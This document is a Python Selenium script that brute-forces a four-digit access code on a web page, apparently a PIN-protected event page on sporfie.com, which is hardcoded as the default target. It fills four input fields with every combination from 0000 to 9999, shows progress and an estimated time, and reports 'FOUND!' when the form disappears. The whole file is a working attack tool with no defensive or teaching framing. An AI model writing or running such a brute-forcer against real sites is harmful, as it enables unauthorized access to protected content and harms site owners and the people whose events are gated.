import keyboard,time,os
import selenium
from selenium import webdriver
from selenium.webdriver.common.by import By
def main(url,reverse = False):
    start_time = time.time()
    last_time = time.time()

    options = webdriver.ChromeOptions()
    options.add_argument('headless')
    options.add_argument("--mute-audio")
    driver = webdriver.Chrome(options=options)
    driver.get(url)
    os.system('cls')
    last_try = []
    progress_bar = ''
    completetion_percentage = 0
    

    success = False
    while not success:
        try:
            i1 = driver.find_element(By.XPATH, '/html/body/div[1]/main/div/div/div/input[1]')
            i2 = driver.find_element(By.XPATH, '/html/body/div[1]/main/div/div/div/input[2]')
            i3 = driver.find_element(By.XPATH, '/html/body/div[1]/main/div/div/div/input[3]')
            i4 = driver.find_element(By.XPATH, '/html/body/div[1]/main/div/div/div/input[4]')
        except:
            pass
        else:
            success = True
    rang = range(10)
    if reverse == True:
        rang = range(10)[::-1]
    for n1 in rang:
        n1 = str(n1)
        for n2 in rang:
            n2 = str(n2)
            completetion_percentage += 1
            progress_bar += '█'
            for n3 in rang:
                n3 = str(n3)
                for n4 in rang:
                    n4 = str(n4)
                    success = False
                    exeption_time = time.time()
                    while not success:
                        try:
                            i1 = driver.find_element(By.XPATH, '/html/body/div[1]/main/div/div/div/input[1]')
                            i2 = driver.find_element(By.XPATH, '/html/body/div[1]/main/div/div/div/input[2]')
                            i3 = driver.find_element(By.XPATH, '/html/body/div[1]/main/div/div/div/input[3]')
                            i4 = driver.find_element(By.XPATH, '/html/body/div[1]/main/div/div/div/input[4]')
                        except:
                            print(''.join((url,'\033[0K')))
                            try:
                                container = driver.find_element(By.XPATH, '/html/body/div[1]/main/div[2]')
                            except:
                                if time.time() - exeption_time > 10:
                                    print('\33[31m---------------------\033[0K\nAn Error has probably occured. Please check your internet connection\033[0K\n---------------------\033[0K')
                            else:
                                print(''.join(('\033[32m-----------------\n\033[0KFOUND!: ',last_try[0],' ',last_try[1],' ',last_try[2],' ',last_try[3],'\033[0K\n-----------------\033[0K')))
                            print(''.join(('\033[33mtesting: ',last_try[0],' ',last_try[1],' ',last_try[2],' ',last_try[3],'\033[0K\n\033[37m',str(completetion_percentage),'% ',progress_bar,'\033[0J\n\033[90mestimated time: ',str(estimated_time),'m\033[0J\033[99A\r\033[37m')),end=' ')
                        else:
                            success = True
                    i1.send_keys(n1)
                    i2.send_keys(n2)
                    i3.send_keys(n3)
                    i4.send_keys(n4)
                    last_try = [n1,n2,n3,n4]
                    if not reverse:
                        estimated_time = int((time.time()-last_time)*(10000-int(''.join((n1,n2,n3,n4))))/60)
                    else:
                        estimated_time = int((time.time()-last_time)*(int(''.join((n1,n2,n3,n4))))/60)
                    last_time = time.time()

if __name__ == '__main__':
    url = input('enter url: ')
    if url == '':
        url = 'https://www.sporfie.com/event/-NS0WIJKkqj8jnWv7knu'
    if input('reverse (y/n): ') == 'y':
        r = True
    else:
        r = False

    main(url,r)